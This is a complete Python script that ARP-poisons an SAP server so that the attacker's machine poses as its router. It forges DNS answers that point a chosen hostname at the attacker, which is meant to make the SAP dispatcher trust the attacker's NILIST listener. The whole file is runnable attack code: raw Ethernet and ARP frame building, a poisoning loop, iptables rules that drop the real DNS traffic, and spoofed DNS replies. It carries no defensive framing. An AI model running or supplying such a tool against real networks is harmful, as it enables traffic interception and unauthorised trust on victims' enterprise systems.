#!/usr/bin/env python3
"""
nilist_arp_dns.py — ARP-spoof + DNS intercept for NILIST trust propagation.

Problem:
  SAP dispatcher does getnameinfo(192.168.2.210) → "host.example.com",
  then getaddrinfo("host.example.com") → NXDOMAIN from SAP server's DNS.
  Result: dispatcher never connects to our NILIST listener → trust never established.

Strategy:
  1. ARP-poison 192.168.2.209 (SAP server): claim our MAC (00:0c:29:c5:32:3a)
     owns the router IP (192.168.2.1) so DNS queries destined for the router
     arrive at our machine instead.
  2. Enable IP forwarding so non-intercepted traffic still reaches the real router.
  3. Drop DNS forwarding to router via iptables so we're the sole DNS responder.
  4. Sniff frames at L2 (AF_PACKET); intercept DNS UDP queries from SAP server:
       - host.example.com A? → reply A=192.168.2.210
       - all other queries         → forward to 8.8.8.8 and relay answer back
  5. Forward all non-DNS frames from SAP server to real router MAC.
  6. On Ctrl+C: restore ARP, remove iptables rules, optionally disable IP forward.

Usage (as root on 192.168.2.210):
  sudo python3 nilist_arp_dns.py [--iface ens33] [--verbose]

Then run betrusted + SAPXPG as usual — the DNS fix enables NILIST pull to work.
"""

import socket
import struct
import time
import threading
import sys
import os
import select
import subprocess
import argparse
import signal

# ---- Network config ----
ATTACKER_IP  = "192.168.2.210"
ATTACKER_MAC = bytes.fromhex("000c29c5323a")   # 00:0c:29:c5:32:3a
ROUTER_IP    = "192.168.2.1"
ROUTER_MAC   = bytes.fromhex("b05b99f40d1b")   # b0:5b:99:f4:0d:1b
SAP_IP       = "192.168.2.209"
SAP_MAC      = bytes.fromhex("000c29a997dc")   # 00:0c:29:a9:97:dc
IFACE        = "ens33"

REVERSE_HOST = "host.example.com"
UPSTREAM_DNS = ("8.8.8.8", 53)

# The IP we ARP-spoof as (typically the router, but could be any DNS server
# the SAP server uses). Override with --dns-server if different.
_SPOOF_DNS_IP  = ROUTER_IP
_SPOOF_DNS_MAC = ROUTER_MAC    # real MAC of the host we're impersonating

_stop = threading.Event()
_ip_forward_was_enabled = False


# ---- Low-level helpers ----

def ip2b(ip: str) -> bytes:
    return socket.inet_aton(ip)


def ip_checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def build_arp_reply(spoof_ip: str, spoof_mac: bytes,
                    target_ip: str, target_mac: bytes) -> bytes:
    """Build an Ethernet ARP reply frame: sender claims spoof_ip is at spoof_mac."""
    eth = target_mac + spoof_mac + b"\x08\x06"
    arp = (b"\x00\x01"          # HW type: Ethernet
           b"\x08\x00"          # proto: IPv4
           b"\x06\x04"          # HW/proto sizes
           b"\x00\x02"          # opcode: reply
           + spoof_mac  + ip2b(spoof_ip)
           + target_mac + ip2b(target_ip))
    return eth + arp


def build_ip_udp(src_ip: str, dst_ip: str,
                 src_port: int, dst_port: int,
                 payload: bytes) -> bytes:
    """Build an IP/UDP packet (no UDP checksum — zero is valid for UDP)."""
    udp_len = 8 + len(payload)
    udp = struct.pack("!HHHH", src_port, dst_port, udp_len, 0) + payload

    ip_id = int(time.time() * 1000) & 0xFFFF
    ip_hdr = struct.pack("!BBHHHBBH4s4s",
                         0x45, 0, 20 + udp_len, ip_id, 0,
                         64, 17, 0,
                         ip2b(src_ip), ip2b(dst_ip))
    chk = ip_checksum(ip_hdr)
    ip_hdr = ip_hdr[:10] + struct.pack("!H", chk) + ip_hdr[12:]
    return ip_hdr + udp


def build_eth(src_mac: bytes, dst_mac: bytes,
              payload: bytes, etype: int = 0x0800) -> bytes:
    return dst_mac + src_mac + struct.pack("!H", etype) + payload


# ---- DNS helpers ----

def dns_decode_name(data: bytes, off: int) -> tuple:
    labels = []
    jumped = False
    orig = off
    for _ in range(50):
        if off >= len(data):
            break
        L = data[off]
        if L == 0:
            off += 1
            break
        if (L & 0xC0) == 0xC0:
            ptr = ((L & 0x3F) << 8) | data[off + 1]
            if not jumped:
                orig = off + 2
            jumped = True
            off = ptr
            continue
        off += 1
        labels.append(data[off:off + L].decode("ascii", errors="replace"))
        off += L
    return ".".join(labels), (orig if jumped else off)


def dns_a_response(query: bytes, ip: str) -> bytes:
    """Build a DNS A-record reply for query, returning ip."""
    if len(query) < 12:
        return b""
    txid = query[:2]
    try:
        _, off = dns_decode_name(query, 12)
        off += 4   # skip QTYPE + QCLASS
    except Exception:
        return b""
    question = query[12:off]
    try:
        ip_bytes = socket.inet_aton(ip)
    except Exception:
        return b""
    hdr = (txid
           + struct.pack("!H", 0x8400)          # QR=1 AA=1 RCODE=0
           + struct.pack("!HHHH", 1, 1, 0, 0))  # QDCOUNT=1 ANCOUNT=1
    ans = (b"\xc0\x0c"                           # pointer to question name
           + struct.pack("!HHI", 1, 1, 60)       # TYPE=A CLASS=IN TTL=60
           + struct.pack("!H", 4) + ip_bytes)
    return hdr + question + ans


def dns_forward(query: bytes) -> bytes:
    """Forward DNS query to upstream and return response, or b'' on error."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(3.0)
        s.sendto(query, UPSTREAM_DNS)
        resp, _ = s.recvfrom(4096)
        s.close()
        return resp
    except Exception:
        return b""


# ---- iptables helpers ----

def _ipt(args: list) -> bool:
    try:
        r = subprocess.run(["iptables"] + args,
                           capture_output=True, text=True, timeout=5)
        return r.returncode == 0
    except Exception:
        return False


def setup_iptables():
    """Block kernel forwarding of DNS from SAP→spoofed-DNS so only we reply."""
    ok1 = _ipt(["-t", "filter", "-I", "FORWARD",
                 "-s", SAP_IP, "-d", _SPOOF_DNS_IP,
                 "-p", "udp", "--dport", "53", "-j", "DROP"])
    ok2 = _ipt(["-t", "filter", "-I", "FORWARD", "-s", SAP_IP, "-j", "ACCEPT"])
    ok3 = _ipt(["-t", "filter", "-I", "FORWARD", "-d", SAP_IP, "-j", "ACCEPT"])
    if ok1:
        print(f"[iptables] DNS FORWARD DROP for {SAP_IP}→{_SPOOF_DNS_IP} added")
    else:
        print("[iptables] WARNING: could not add DNS DROP rule (iptables unavailable?)")
    if ok2 and ok3:
        print("[iptables] FORWARD ACCEPT for SAP traffic added")


def cleanup_iptables():
    _ipt(["-t", "filter", "-D", "FORWARD",
          "-s", SAP_IP, "-d", _SPOOF_DNS_IP,
          "-p", "udp", "--dport", "53", "-j", "DROP"])
    _ipt(["-t", "filter", "-D", "FORWARD", "-s", SAP_IP, "-j", "ACCEPT"])
    _ipt(["-t", "filter", "-D", "FORWARD", "-d", SAP_IP, "-j", "ACCEPT"])
    print("[iptables] Rules removed")


# ---- IP forwarding ----

def enable_ip_forward() -> bool:
    global _ip_forward_was_enabled
    try:
        with open("/proc/sys/net/ipv4/ip_forward") as f:
            _ip_forward_was_enabled = f.read().strip() == "1"
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1\n")
        print(f"[*] IP forwarding enabled (was {'on' if _ip_forward_was_enabled else 'off'})")
        return True
    except Exception as e:
        print(f"[!] IP forward: {e}")
        return False


def restore_ip_forward():
    if not _ip_forward_was_enabled:
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("0\n")
            print("[*] IP forwarding restored to off")
        except Exception:
            pass


# ---- ARP poison thread ----

def arp_thread(sock: socket.socket, interval: float):
    frame = build_arp_reply(_SPOOF_DNS_IP, ATTACKER_MAC, SAP_IP, SAP_MAC)
    mac_str = ":".join(f"{b:02x}" for b in ATTACKER_MAC)
    print(f"[ARP] Poisoning {SAP_IP}: {_SPOOF_DNS_IP} = {mac_str} (every {interval}s)")
    while not _stop.is_set():
        try:
            sock.send(frame)
        except Exception:
            pass
        time.sleep(interval)


def arp_restore(sock: socket.socket):
    """Send correct ARP replies to undo our poisoning."""
    frame = build_arp_reply(_SPOOF_DNS_IP, _SPOOF_DNS_MAC, SAP_IP, SAP_MAC)
    mac_str = ":".join(f"{b:02x}" for b in _SPOOF_DNS_MAC)
    print(f"[ARP] Restoring: {_SPOOF_DNS_IP} = {mac_str}")
    for _ in range(5):
        try:
            sock.send(frame)
        except Exception:
            pass
        time.sleep(0.1)


# ---- Packet sniff / intercept thread ----

def sniff_thread(sock: socket.socket, verbose: bool):
    our_host = REVERSE_HOST.lower()
    print("[*] Packet sniffer running — intercepting DNS from SAP server")

    while not _stop.is_set():
        try:
            rdy, _, _ = select.select([sock], [], [], 0.5)
            if not rdy:
                continue
            frame = sock.recv(65535)
        except (OSError, KeyboardInterrupt):
            break

        if len(frame) < 14:
            continue

        eth_dst  = frame[0:6]
        eth_src  = frame[6:12]
        eth_type = struct.unpack("!H", frame[12:14])[0]

        # Only process IPv4 frames FROM the SAP server arriving at our MAC
        # (these are packets the SAP server thinks go to the router)
        if eth_src != SAP_MAC:
            continue
        if eth_dst != ATTACKER_MAC:
            continue
        if eth_type != 0x0800:
            continue

        ip = frame[14:]
        if len(ip) < 20:
            continue

        ihl      = (ip[0] & 0x0F) * 4
        proto    = ip[9]
        src_ip   = socket.inet_ntoa(ip[12:16])
        dst_ip   = socket.inet_ntoa(ip[16:20])

        # Intercept UDP DNS going to the spoofed DNS server
        if proto == 17 and dst_ip == _SPOOF_DNS_IP:
            udp = ip[ihl:]
            if len(udp) < 8:
                continue
            sport = struct.unpack("!H", udp[0:2])[0]
            dport = struct.unpack("!H", udp[2:4])[0]

            if dport == 53:
                dns = udp[8:]
                # Parse query name + type
                try:
                    qname, off = dns_decode_name(dns, 12)
                    qtype = struct.unpack("!H", dns[off:off + 2])[0]
                except Exception:
                    qname, qtype = "?", 0

                qt_str = {1: "A", 12: "PTR", 28: "AAAA"}.get(qtype, str(qtype))

                if qname.lower() == our_host and qtype == 1:
                    # Inject A record for our reverse hostname
                    resp = dns_a_response(dns, ATTACKER_IP)
                    print(f"[DNS] {src_ip} A {qname} → {ATTACKER_IP}  [INTERCEPTED]")
                else:
                    # Forward to upstream and relay
                    resp = dns_forward(dns)
                    status = "ok" if resp else "FAIL"
                    if verbose or not resp:
                        print(f"[DNS] {src_ip} {qt_str} {qname} [{status}]")

                if resp:
                    # Send DNS reply with src_ip=spoofed DNS IP so SAP trusts it
                    ip_pkt  = build_ip_udp(_SPOOF_DNS_IP, src_ip, 53, sport, resp)
                    eth_pkt = build_eth(ATTACKER_MAC, SAP_MAC, ip_pkt)
                    try:
                        sock.send(eth_pkt)
                    except Exception as e:
                        print(f"[!] DNS reply send error: {e}")
                continue   # don't forward to real router

        # Forward everything else from SAP server to the real router
        # (just rewrite dst MAC to real router MAC)
        fwd = ROUTER_MAC + frame[6:]
        try:
            sock.send(fwd)
        except Exception:
            pass


# ---- Main ----

def main():
    global _SPOOF_DNS_IP, _SPOOF_DNS_MAC

    parser = argparse.ArgumentParser(
        description="ARP poison + DNS intercept — fixes NILIST trust propagation")
    parser.add_argument("--iface", default=IFACE,
                        help=f"Network interface (default: {IFACE})")
    parser.add_argument("--arp-interval", type=float, default=2.0,
                        help="Seconds between ARP poison packets (default: 2.0)")
    parser.add_argument("--verbose", "-v", action="store_true",
                        help="Print all intercepted DNS queries, not just our hostname")
    parser.add_argument("--no-restore", action="store_true",
                        help="Don't restore ARP / iptables on exit (debugging)")
    parser.add_argument("--dns-server", default=None,
                        help=(f"IP of the DNS server the SAP host uses "
                              f"(default: {ROUTER_IP}).  We ARP-spoof this IP."))
    parser.add_argument("--dns-mac", default=None,
                        help=(f"Real MAC of --dns-server for ARP restore "
                              f"(default: {':'.join(f'{b:02x}' for b in ROUTER_MAC)}).  "
                              f"Format: AA:BB:CC:DD:EE:FF"))
    args = parser.parse_args()

    if args.dns_server:
        _SPOOF_DNS_IP = args.dns_server
    if args.dns_mac:
        try:
            _SPOOF_DNS_MAC = bytes.fromhex(args.dns_mac.replace(":", ""))
        except ValueError:
            print(f"[!] Invalid --dns-mac: {args.dns_mac}")
            sys.exit(1)

    if os.geteuid() != 0:
        print("[!] Must run as root (needs AF_PACKET socket + /proc/sys write)")
        sys.exit(1)

    print("=" * 65)
    print(f" NILIST ARP-spoof DNS interceptor")
    print(f"   Attacker : {ATTACKER_IP}  ({':'.join(f'{b:02x}' for b in ATTACKER_MAC)})")
    print(f"   SAP      : {SAP_IP}  ({':'.join(f'{b:02x}' for b in SAP_MAC)})")
    print(f"   Spoofing : {_SPOOF_DNS_IP}  ({':'.join(f'{b:02x}' for b in _SPOOF_DNS_MAC)})")
    print(f"   Override : {REVERSE_HOST} → {ATTACKER_IP}")
    print("=" * 65)

    enable_ip_forward()
    if not args.no_restore:
        setup_iptables()

    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        sock.bind((args.iface, 0))
    except PermissionError:
        print("[!] AF_PACKET socket requires root")
        sys.exit(1)
    except OSError as e:
        print(f"[!] Socket error: {e}")
        sys.exit(1)

    print(f"[*] Raw socket bound to {args.iface}")
    print(f"[*] Press Ctrl+C to stop and restore ARP mapping\n")

    arp_t   = threading.Thread(target=arp_thread,
                               args=(sock, args.arp_interval),
                               daemon=True, name="arp-poison")
    sniff_t = threading.Thread(target=sniff_thread,
                               args=(sock, args.verbose),
                               daemon=True, name="dns-intercept")
    arp_t.start()
    sniff_t.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Stopping...")

    _stop.set()
    time.sleep(0.3)

    if not args.no_restore:
        arp_restore(sock)
        cleanup_iptables()
        restore_ip_forward()

    sock.close()
    print("[*] Done.")


if __name__ == "__main__":
    main()
